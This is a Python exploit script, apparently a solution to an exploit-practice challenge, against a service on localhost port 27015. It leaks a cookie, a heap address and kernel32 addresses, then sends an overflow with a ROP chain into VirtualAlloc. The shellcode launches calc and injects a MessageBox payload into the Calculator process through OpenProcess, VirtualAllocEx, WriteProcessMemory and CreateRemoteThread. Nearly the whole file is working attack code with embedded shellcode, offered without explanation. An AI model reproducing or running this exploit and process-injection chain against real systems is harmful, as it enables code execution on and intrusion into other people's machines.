import socket, struct, binascii, array, time
from nutshell import *

p = lambda x : struct.pack ("<I", x)
u = lambda x : struct.unpack ("<I", x)

signedHex = lambda val, nbits : hex ((val + (1 << nbits)) % (1 << nbits))

def littleE2Hex (x):
	val = binascii.unhexlify (x.encode ("hex") )
	y = array.array ('h', val)
	y.byteswap ()
	return u (val)[0]

kernel32_offset = {"b62f" : 0x52fb6, "dfa3" : 0xe547}

user = "pepe choto\x00"
s = socket.create_connection ( ("127.0.0.1", 27015) )
print "[+] sending user credentials"
s.send (user + "\x00"*(0x200 - len(user)))
# \xf48
for i in range (7):
    print "[!] counter %d" % i
    if i == 0:
        buf = s.recv (15)
        cookie = buf[:4]

        print " [*] cookie: 0x%04x " % littleE2Hex(cookie)
    else:
        buf = s.recv(40)
        if i == 1:
            heap = littleE2Hex(buf[:4])
            print "[!] LEAK heap address: 0x%x" % heap
            egg_heap = heap + 0x907
            print "     heap chunk predicted at 0x%x" % egg_heap

        if i == 2:
            virtualAlloc = littleE2Hex (buf[20:24])
            kernelBase = virtualAlloc - kernel32_offset[buf[20:22].encode("hex")]
            malloc = littleE2Hex (buf[24:28])
            print "[!] LEAKS\n   virtualloc:0x%x, malloc:0x%x, kernel32:0x%x" % (virtualAlloc, malloc, kernelBase)
    
    if i == 0:
        s.send(cookie + p(0x1) + p(0x1) + "\x90" *(0x200 - (8 + len(cookie))))
        s.send("A"*2)
    if i == 1:
        s.send(cookie + p(0x30) + p(0x10) + "\x90" *(0x200 - (8 + len(cookie))))
        s.send("A"*(0x40))
       
    if i == 2:
        s.send(cookie + p(0x30) + p(0x857) + "\x90" *(0x200 - (8 + len(cookie))))
        s.send(cookie + "B"*(0x30 - len(cookie)))
        s.send(cookie + "C"*(0x857 - len(cookie)))
       
    if i == 3:
        calc = "calc.exe"

        user = "user32.dll"
        user += "\x00"*(12 - len(user))
        
        FWindow = "FindWindowA"
        FWindow += "\x00"*(12 - len(FWindow))
        
        GetPid = "GetWindowThreadProcessId"
        GetPid += "\x00"*(28 - len(GetPid))

        Open = "OpenProcess"
        Open += "\x00"*(12 - len(Open))

        VallocEx = "VirtualAllocEx"
        VallocEx += "\x00"*(16 - len(VallocEx))

        Write = "WriteProcessMemory"
        Write += "\x00"*(20 - len(Write))

        Create = "CreateRemoteThread"
        Create += "\x00"*(20 - len(Create))
        
        ExitProcess = "ExitProcess\x00"
        egg = Nutshell("x86", 0)
       

        
        sc_msgbox  = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
        sc_msgbox += "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
        sc_msgbox += "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
        sc_msgbox += "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
        sc_msgbox += "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
        sc_msgbox += "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
        sc_msgbox += "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
        sc_msgbox += "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
        sc_msgbox += "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
        sc_msgbox += "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
        sc_msgbox += "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
        sc_msgbox += "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
        sc_msgbox += "\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
        sc_msgbox += "\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
        sc_msgbox += "\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
        sc_msgbox += "\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
        sc_msgbox += "\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
        sc_msgbox += "\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
        sc_msgbox += "\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
        sc_msgbox += "\x2C\x57\x68\x43\x4C\x53\x21\x8B\xDC\x57"
        sc_msgbox += "\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
        sc_msgbox += "\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
        sc_msgbox += "\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
        sc_msgbox += "\x40\xFF\x54\x24\x40\x57\xFF\xD0" 

        execalc = "\x66\x81\xE4\xFC\xFF\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52"
        execalc += "\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E"
        execalc += "\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C"
        execalc += "\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F"
        execalc += "\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7\x90"

        shellcode = execalc
        shellcode += egg.nut_revolve("esi", "ebx") # esi = GetProcAddress, ebx = GetModuleHandle
        
        shellcode += egg.nut_asm("push 0x%s" % user[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % user[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % user[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("call ebx")
        shellcode += egg.nut_asm("mov edi, eax") # edi = module handle user32.dll
        shellcode += egg.nut_asm("add esp, 0xC")
    
        shellcode += egg.nut_asm("push 0x%s" % FWindow[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % FWindow[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % FWindow[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push edi")
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 4], eax") #FindWindow

        shellcode += egg.nut_asm("push 0x%s" % GetPid[24:28][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % GetPid[20:24][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % GetPid[16:20][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % GetPid[12:16][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % GetPid[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % GetPid[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % GetPid[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push edi")
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 8], eax") #GetWindowThreadProcessId
        

        shellcode += egg.nut_asm("push 0x%s" % ExitProcess[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % ExitProcess[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % ExitProcess[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push %s"  % hex(kernelBase))
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 12], eax") #ExitProcess

        shellcode += egg.nut_asm("push 0x%s" % VallocEx[12:16][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % VallocEx[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % VallocEx[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % VallocEx[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push %s" % hex(kernelBase))
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 16], eax") #VirtualAlloEx

        shellcode += egg.nut_asm("push 0x%s" % Open[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % Open[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Open[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push %s" % hex(kernelBase))
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 20], eax") #OpenProcess

        shellcode += egg.nut_asm("push 0x%s" % Write[16:20][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Write[12:16][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Write[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % Write[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Write[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push %s" % hex(kernelBase))
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 24], eax") #WriteProcess
       
        shellcode += egg.nut_asm("push 0x%s" % Create[16:20][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Create[12:16][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Create[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % Create[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % Create[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push %s" % hex(kernelBase))
        shellcode += egg.nut_asm("call esi")
        shellcode += egg.nut_asm("mov [ebp + 28], eax") #CreateRemoteProcess

        calc = "Calculator\x00"
        shellcode += egg.nut_asm("push 0x%s" % calc[8:12][::-1].encode("hex")) 
        shellcode += egg.nut_asm("push 0x%s" % calc[4:8][::-1].encode("hex"))
        shellcode += egg.nut_asm("push 0x%s" % calc[:4][::-1].encode("hex"))
        shellcode += egg.nut_asm("mov [ebp + 32], esp")
        shellcode += egg.nut_asm("mov eax, [ebp + 4]")
        shellcode += egg.nut_asm("xor edi, edi")
        shellcode += egg.nut_asm("push [ebp + 32]")
        shellcode += egg.nut_asm("push edi")
        shellcode += egg.nut_asm("call eax") # FindWindow(NULL, "Calculator")

        shellcode += egg.nut_asm("mov [ebp + 36], eax")
        shellcode += egg.nut_asm("mov eax, [ebp + 8]")
        shellcode += egg.nut_asm("push esp")
        shellcode += egg.nut_asm("push [ebp + 36]")
        shellcode += egg.nut_asm("call eax") # GetWindowThreadProcessId([ebp + 28], esp)

        shellcode += egg.nut_asm("mov eax, [esp]")
        shellcode += egg.nut_asm("mov ebx, [ebp + 20]")
        shellcode += egg.nut_asm("push eax")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push 0x1f0fff")
        shellcode += egg.nut_asm("call ebx") # OpenProcess(process_all, False, pid)
        
        shellcode += egg.nut_asm("mov [ebp + 40], eax") # handle
        shellcode += egg.nut_asm("mov ebx, [ebp+16]")
        shellcode += egg.nut_asm("push 0x40")
        shellcode += egg.nut_asm("push 0x1000")
        shellcode += egg.nut_asm("push %s" % hex(len(sc_msgbox)))
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push [ebp + 40]")
        shellcode += egg.nut_asm("call ebx") # VirtuallAllocEx(handle, 0, len(winexec), 0x1000, 0x40)
    
        shellcode += egg.nut_asm("mov [ebp + 44], eax") # remote_mem
        shellcode += egg.nut_asm("mov ebx, [ebp + 24]")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push %s" % hex(len(sc_msgbox)))
        shellcode += egg.nut_asm("push %s" % hex(egg_heap+0x2A3))
        shellcode += egg.nut_asm("push eax")
        shellcode += egg.nut_asm("push [ebp + 40]")
        shellcode += egg.nut_asm("call ebx")


        shellcode += egg.nut_asm("mov ebx, [ebp + 28]")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push [ebp + 44]")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("push [ebp + 40]")
        shellcode += egg.nut_asm("call ebx")

        shellcode += egg.nut_asm("mov eax, [ebp + 12]")
        shellcode += egg.nut_asm("push 0x0")
        shellcode += egg.nut_asm("call eax")
        shellcode += "\x90"*10
        shellcode += sc_msgbox

        rop  = p (virtualAlloc)
        rop += p (egg_heap + 30)
        rop += p (egg_heap)
        rop += p (0x1000)
        rop += p (0x1000)
        rop += p (0x40)
        rop += p (egg_heap + 30)
        rop += "\x90"* 10
        rop += shellcode

        s.send(cookie + p(0x468) + p(0x1000) + "\x90"*(0x200 - (8 + len(cookie))))
        s.send(rop + "\x90"*(1092 - len(rop)) + cookie + "B"*(0x468 - 1096 - 8) + p(kernelBase+0x2e170) + "BBBB" )
        s.send(rop + "B"*(0x1000 - len(rop)))
        
    if i > 3:
        s.send(cookie + p(0x1000) + p(0x1) + "\x90"*(0x200 - (8 + len(cookie))))
        s.send("A"*(0x1000 + 1))
